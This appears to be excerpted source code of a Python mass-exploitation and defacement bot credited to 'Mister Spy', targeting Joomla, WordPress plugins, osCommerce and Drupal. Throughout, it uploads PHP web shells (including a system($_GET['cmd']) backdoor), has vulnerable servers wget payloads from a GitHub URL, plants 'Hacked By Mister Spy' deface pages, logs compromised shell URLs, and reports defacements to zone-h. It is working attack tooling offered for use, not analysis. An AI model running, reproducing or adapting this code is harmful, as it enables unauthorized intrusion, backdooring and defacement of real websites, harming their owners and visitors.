...
def zone(url) :
    r = requests.post("http://zone-h.com/notify/single", data={'defacer': 'Mister Spy', 'domain1': url, 'hackmode': 1, 'reason': 1})
...
'''
        ...
        self.Jce_Deface_image = 'files/def.gif'
 ...
 |_|  |_|_|___/\__\___|_|    |_____/| .__/ \__, |
                                    | |     __/ |
                                    |_|    |___/
				King Say Hello Ladys :D 
				see the magic 
		I'm Fucking kamikaze
        Thanks To : Kill3r 
    """
    ...
    def RCE_Joomla(self, site):
        try:
            pl = self.generate_payload(
                "base64_decode('')")
            headers = {
                'User-Agent': pl
            }
            try:
            ...
            try:
                ...
                if rr:
                    ...
                    if 'Vuln!!' in ShellCheck.text:
                        ...
                        with open('result/Shells2019.txt', 'a') as writer:
    ...
    def mediacheck(self, site):
        try:
            ...
            if 'Filedata[]' in GetConfig.text.encode('utf-8'):
                ...
                with open('result/ValidComMedia.txt', 'a') as ww:
                    ww.write(Exp+'\n')
            else:
        ...
        try:
            ...
            if 'success' or 'File exists' in GoT.text.encode('utf-8'):
                if '/images/pwn' in GoT.text.encode('utf-8'):
                    IndeXpath = 'http://' + site + '/images/def.gif'
                else:
                    try:
        ...
        try:
            ...
            if '/upload_ok.png' in Got.text.encode('utf-8'):
                ...
                if 'MrSpyUp!!' in Check.text:
                    ...
                    if 'SpyUploaderV1' in ChecksHell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/vuln.htm')
                        zone(site + '/vuln.htm')
                        with open('result/deface.txt', 'a') as writer:
            ...
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                ...
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Check.text.encode('utf-8'):
                    ...
                    with open('result/deface.txt', 'a') as writer:
                        ...
                        zone(site + '/tmp/plupload/def.gif')
                else:
    ...
    def Com_AdsManager_Shell(self, site):
        try:
            ...
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                ...
                if 'spy0xProjectTop50' in Check.text.encode('utf-8'):
                    if 'SpyUploaderV1' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'SpyUploaderV1' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/vuln.htm')
                        zone(site + '/vuln.htm')
                        with open('result/deface.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                ...
                elif 'SpyUploaderV1' in Check2.text.encode('utf-8'):
                    if 'SpyUploaderV1' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'SpyUploaderV1' in CheckIndex.text.encode('utf-8'):
                        ...
                        self.Com_AdsManager(site)
                elif 'SpyUploaderV1' in Check3.text.encode('utf-8'):
                    if 'SpyUploaderV1' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
    ...
    def Jce_Test(self, site):
        try:
            ...
            CheckIndex = requests.get(site + '/images/def.gif', timeout=5)          
                ...
                if 'has been successfully' or 'already exists' in Post.text.encode('utf-8'):
                    ...
                    if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text.encode('utf-8'):
                        ...
                        self.Print_Vuln_index(site + '/administrator/components/com_alberghi/' +
                                              self.Jce_Deface_image.split('/')[1])
                        zone(site + '/administrator/components/com_alberghi/def.gif')
                    else:
                    ...
                    if 'Now!MrSpyUp!!' in CheckShell.text.encode('utf-8'):
                        ...
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.pagelinesExploitShell.split('/')[1] + '\n')
                        with open('result/trash.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.Jce_Deface_image.split('/')[1])
                        zone(site + '/wp-content/plugins/downloads-manager/upload/def.gif')
                        with open('result/trash.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                else:
    ...
    def wp_content_injection(self, site):
        try:
            ...
            xxx = str(zaq) + 'bbx'
            data = json.dumps({
                'content': '<h1>Vuln!! HackedByMrSpy HackedByMrSpy HackedByMrSpy Path it now!!\n<p><title>Vuln!! Hacked By Mr Spy Path it now!!<br /><h2>Hacked By Mister Spy</h2>\n</title></p></h1>\n',
            ...
            if GoT:
                CheckIndex = 'http://' + site + '/spy.htm'
                zcheck = requests.get(CheckIndex, timeout=10)
                if 'HackedByMrSpy' in zcheck.text:
                    self.Print_Vuln_index(site + '/spy.htm') 
                    zone(site + '/spy.htm')                    
                    with open('result/deface.txt', 'a') as writer:
                        writer.write(site + '/spy.htm' + '\n')
                else:
    ...
    def wp_mobile_detector(self, site):
        try:
            ExploitShell = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/settings_auto.php'
            ExploitGifUpload = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/pwn.gif'
            ...
            if 'GIF89a' in GoT.text.encode('utf-8'):
                ...
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    ...
                    if 'MrSpyUp!!' in CheckShell.text.encode('utf-8'):
                        ...
                        if 'SpyUploaderV1' in Xshell.text.encode('utf-8'):
                        ...
                        if 'spy0xProjectTop50' in Xindex.text.encode('utf-8'):
                            self.Print_Vuln_index(site + '/vuln.htm')
                            zone(site+'/vuln.htm')
                            with open('result/deface.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        ...
                        zone(site + '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif')
                        with open('result/trash.txt', 'a') as writer:
            ...
            try:
                ...
                if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in GoT.text.encode('utf-8'):
                    ...
                    if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                        ...
                        zone(site + '/wp-content/uploads/wysija/themes/rock/pwn.gif')
                        with open('result/trash.txt', 'a') as writer:
                ...
                try:
                    ...
                    if '.php5' in GoT.text.encode('utf-8'):
                        ...
                        if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                            ...
                            if 'SpyUploaderV1' in Checkshell2.text.encode('utf-8'):
                                Checkshell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5)
                                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5)
                                if 'SpyUploaderV1' in Checkshell.text.encode('utf-8'):
                                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
    ...
    def Gravity_forms_Index(self, site):
        ...
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'def.gif'}
        post_data2 = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'def.gif'}
        try:
            url = "http://" + site + '/?gf_page=upload'
            ...
            CheckIndex = requests.get('http://' + site + '/_input_3_def.gif', timeout=5)
            CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_def.gif', timeout=5)
            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/_input_3_def.gif')
                zone(site + '/_input_3_def.gif')
                with open('result/deface.txt', 'a') as writer:
                    writer.write(site + '/_input_3_def.gif' + '\n')
            elif 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex2.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/wp-content/_input_3_def.gif')
                zone(site + '/wp-content/_input_3_def.gif')
                with open('result/deface.txt', 'a') as writer:
                    writer.write(site + '/wp-content/_input_3_def.gif' + '\n')
            else:
                self.Print_NotVuln('Gravity-Forms', site)
        except Exception, e:
            self.Print_NotVuln('Gravity-Forms', site)
        ...
        try:
            ...
            if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                ...
                if 'GIF89a' in CheckRev.text.encode('utf-8'):
                    ...
                    if 'SpyUploaderV1' in ShellCheck.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                ...
                if 'GIF89a' in CheckRev2.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                ...
                if 'GIF89a' in CheckRev7.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                ...
                if 'GIF89a' in CheckRev8.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
                ...
                if 'GIF89a' in CheckRev9.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/themes/pindol/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                        writer.write(
                ...
                if 'GIF89a' in CheckRev11.text.encode('utf-8'):
                    ...
                    zone(site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/pwn.gif')
                    with open('result/trash.txt', 'a') as writer:
                        writer.write(
                            site + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/pwn.gif' + '\n')
                    self.Revslider_Config(site)
    ...
    def viral_optins(self, site):
        try:
            ...
            if 'id="wpvimgres"' in x.text.encode('utf-8'):
                ...
                print find[0]
                if 'spy0xProjectTop50' in GoT.text.encode('utf-8'):
                ...
                elif 'spy0xProjectTop50' in GoT2.text.encode('utf-8'):
        ...
        try:
            ...
            if GoT.status_code == 200 or 'success' in GoT.text.encode('utf-8'):
                ...
                if 'MrSpyUp!!' in CheckShell.text.encode('utf-8'):
                    ...
                    if 'SpyUploaderV1' in shellChecker.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/wp-content/vuln.php' + '\n')
                    IndexCheck = requests.get('http://' + site + '/vuln.htm', timeout=5)
                    if 'spy0xProjectTop50' in IndexCheck.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/vuln.htm')
                        zone(site + '/vuln.htm')
                        with open('result/deface.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
    ...
    def osCommerce(self, site):
        try:
            ...
            if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
                ...
                shell = '\');'
                shell += 'system("wget https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/OsComPayLoad.php");'
                shell += '/*'
                deface = '\');'
    ...
    def Com_jwallpapers_Shell(self, site):
        try:
            ...
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                ...
                if 'SpyUploaderV1' in Check.text.encode('utf-8'):
                    if 'SpyUploaderV1' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('result/Shells2019.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
    ...
    class DrupalGedden2(object):
        ...
        def Version7Drupal(self, site):
            try:
                payloadshell = "Vuln!! MrSpydrupalv7<?php system($_GET['cmd']); ?>"
                PrivatePAyLoad = "echo 'Vuln!! patch it Now!' > vuln.htm;" \
                             " echo '" + payloadshell + "'> sites/default/files/vuln.php;" \
                                                        ...
                                                        " wget 'https://raw.githubusercontent.com/apidotmy/ICG-BOT/main/files/settings_auto.php'"
                ...
                if m:
                    ...
                    if 'MrSpydrupalv7' in a.text.encode('utf-8'):
                        ...
                        if 'spy0xProjectTop50' in gg.text.encode('utf-8'):
                            ...
                            if 'MrSpydrupalv7' in Checkshell.text.encode('utf-8'):
        ...
        def Version8Drupal(self, site):
            try:
                ...
                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                           'mail[#type]': 'markup', 'mail[#markup]': 'echo Vuln!! Hacked By MisterSppy 007xHacked patch it Now!> vuln.htm'}
                ...
                if r.status_code == 200:
                    ...
                    if '007xHacked' in a.text.encode('utf-8'):
